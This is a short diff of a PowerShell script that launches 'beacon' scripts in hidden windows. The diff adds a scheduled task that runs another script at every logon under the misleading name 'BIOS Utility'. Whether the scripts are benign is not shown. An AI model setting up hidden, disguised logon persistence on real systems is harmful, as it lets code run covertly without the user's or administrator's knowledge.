@@ -2,6 +2,10 @@ Start-Process -FilePath 'powershell.exe' -ArgumentList '-command "& {C:\temp\bea
 Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\GetState.ps1}"'
 Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\task.ps1}"'
 
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "C:\temp\beacon\run.ps1"
+$Trigger = New-ScheduledTaskTrigger -AtLogOn
+Set-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "BIOS Utility"
+
 #$process = Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\GetState.ps1}"' -PassThru
 
 $processIds = @(Get-Process -Name powershell -ErrorAction SilentlyContinue).Id
